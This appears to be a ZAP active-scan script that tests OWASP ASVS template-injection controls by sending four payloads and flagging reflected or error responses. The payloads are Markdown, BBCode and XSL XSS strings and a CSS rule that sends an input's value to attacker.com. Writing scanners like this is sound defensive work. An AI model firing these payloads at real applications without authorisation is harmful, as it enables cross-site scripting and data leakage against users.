"""

Script testing 5.2.8 and 5.2.5 controls from OWASP ASVS 4.0:
'Verify that the application sanitizes, disables, or sandboxes user-supplied scriptable or expression 
template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar.'

'Verify that the application protects against template injection attacks by 
ensuring that any user input being included is sanitized or sandboxed.'

This script will attempt to inject various template language payloads to see if they return in the response body without being sanatized or escaped or,
causes the server to return an error.

"""

def scanNode(sas, msg):
  pass

def scan(sas, msg, param, value):
  #alert parameters
  alertRisk= 3
  alertConfidence = 2
  alertTitle = "5.2.8 & 5.2.5 Verify that the application sanitizes, disables, or sandboxes template language content."
  alertDescription = "Verify that the application sanitizes, disables, or sandboxes user-supplied scriptable or expression template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar." + "\n" + "5.2.5 Verify that the application protects against template injection attacks by ensuring that any user input being included is sanitized or sandboxed."
  url = msg.getRequestHeader().getURI().toString()
  alertParam = ""
  alertAttack = ""
  alertInfo = "https://owasp.org/www-project-java-html-sanitizer/"
  alertSolution = ""
  alertEvidence = "" 
  cweID = 94
  wascID = 0

  #template injection payload tuples
  markdown = ('Markdown', '[a](javascript:alert(1))')
  css = ('CSS', 'input[name="id"]{ background: url(https://attacker.com/log?value=id);}')
  xsl = ('XSL', '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> <xsl:template match="/"> <script>alert(1)</script> </xsl:template> </xsl:stylesheet>')
  bbcode = ('BBCode', '[color=#ff0000;xss:expression(alert(String.fromCharCode(88,83,83)));]XSS[/color]')


  attacks = [markdown, css, xsl, bbcode]

  #clone message
  msg = msg.cloneRequest();

  #loop through attacks
  for pair in attacks:
    attack = pair[1]
  
    # setParam (message, parameterName, newValue)
    sas.setParam(msg, param, attack);

    # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
    sas.sendAndReceive(msg, False, False);

    code = str(msg.getResponseHeader().getStatusCode()) # get status code

    #check if attack payload is reflected back in the response body or server errror, if so raise alert
    try: # use try/except to avoid parsing issues from invalid response bodies
      body = str(msg.getResponseBody())
      if (attack in body):
        alertAttack = attack
        alertEvidence = pair[0] + " Payload: " + attack + " found in Response Body"
        sas.raiseAlert(alertRisk, alertConfidence, alertTitle, alertDescription, 
        url, alertParam, alertAttack, alertInfo, alertSolution, alertEvidence, cweID, wascID, msg);
      elif (code == '500'): #check for server error code (500)
        alertAttack = attack
        alertEvidence = "Status Code: " + code + "\n" + "Attack triggered server error."
        sas.raiseAlert(alertRisk, alertConfidence, alertTitle, alertDescription, 
        url, alertParam, alertAttack, alertInfo, alertSolution, alertEvidence, cweID, wascID, msg);
    except:
      pass

